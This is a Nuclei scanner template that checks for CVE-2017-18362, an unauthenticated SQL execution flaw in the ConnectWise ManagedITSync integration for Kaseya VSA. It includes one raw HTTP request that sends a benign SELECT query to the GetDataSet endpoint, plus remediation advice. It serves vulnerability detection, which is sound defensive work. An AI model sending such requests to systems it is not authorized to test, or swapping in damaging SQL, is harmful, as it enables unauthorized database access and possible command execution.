id: CVE-2017-18362

info:
  name: ConnectWise ManagedITSync (Kaseya) - Unauthenticated SQL Execution
  author: imbios
  severity: critical
  description: |
    ConnectWise ManagedITSync integration for Kaseya VSA exposes the `ManagedIT.asmx` web service
    that allows unauthenticated execution of arbitrary SQL via endpoints like `GetDataSet`.
    This template sends a safe `SELECT` query and confirms data is returned, demonstrating the issue.
  impact: |
    An unauthenticated attacker can run arbitrary SQL against the Kaseya VSA database. In some
    environments this can be escalated to OS command execution (e.g., via `xp_cmdshell`).
  remediation: |
    Remove/disable the ManagedITSync integration or restrict access per vendor guidance. Apply
    network ACLs and IP/domain restrictions to the service and ensure it is not internet-exposed.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-18362
    - https://github.com/kbni/owlky
    - https://docs.connectwise.com/ConnectWise_Documentation/140/Kaseya_-_IP_and_Domain_Restrictions
  classification:
    cve-id: CVE-2017-18362
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    max-request: 1
    vendor: connectwise
    product: manageditsync
  tags: cve,cve2017,connectwise,kaseya,soap,sql,unauth,kev

http:
  - raw:
      - |
        POST /KaseyaCwWebService/ManagedIT.asmx/GetDataSet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sql=SELECT%201%20AS%20nuclei_one%2C%202%20AS%20nuclei_two

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<NewDataSet>"
          - "<Table"
          - "<nuclei_one>1</nuclei_one>"
          - "<nuclei_two>2</nuclei_two>"
        condition: and

      - type: word
        part: header
        words:
          - "text/xml"

      - type: status
        status:
          - 200
